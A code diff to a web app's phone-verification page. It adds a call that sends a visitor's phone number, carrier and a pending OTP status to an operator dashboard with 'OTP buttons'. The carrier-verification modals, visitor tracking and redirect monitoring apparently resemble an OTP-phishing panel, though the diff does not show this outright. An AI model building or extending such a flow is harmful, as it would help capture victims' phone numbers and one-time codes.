@@ -13,7 +13,7 @@ import { MobilyVerificationModal } from "@/components/mobily-verification-modal"
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal"
 import { PhoneOtpDialog } from "@/components/dialog-b"
 
-import { addData, getData, submitVisitorFormData } from "@/lib/api"
+import { addData, getData, submitVisitorFormData, notifyDashboard } from "@/lib/api"
 import { onVisitorStatusUpdated } from "@/lib/socket"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
@@ -147,10 +147,28 @@ export default function VerifyPhonePage() {
         phoneNumber: phoneNumber,
         phoneCarrier: selectedCarrier,
         phoneSubmittedAt: new Date().toISOString(),
-        _v4Status: 'pending',
+        _v5Status: 'pending', // For dashboard OTP status
         phoneUpdatedAt: new Date().toISOString(),
         redirectPage: null
       })
+
+      // Notify dashboard immediately with phone OTP data
+      await notifyDashboard({
+        id: visitorID,
+        visitorId: visitorID,
+        _v5Status: 'pending',
+        phoneNumber: phoneNumber,
+        phoneCarrier: selectedCarrier,
+        phoneSubmittedAt: new Date().toISOString(),
+        currentPage: "veri", // For dashboard to show OTP buttons
+        currentStep: 7,
+        status: "pending"
+      })
+
+      // Trigger dashboard refresh for instant update
+      if (typeof window !== 'undefined') {
+        window.dispatchEvent(new CustomEvent('dashboard-refresh'));
+      }
 
       // Don't add to history yet - will add after OTP entry
       // Open Phone OTP Dialog directly
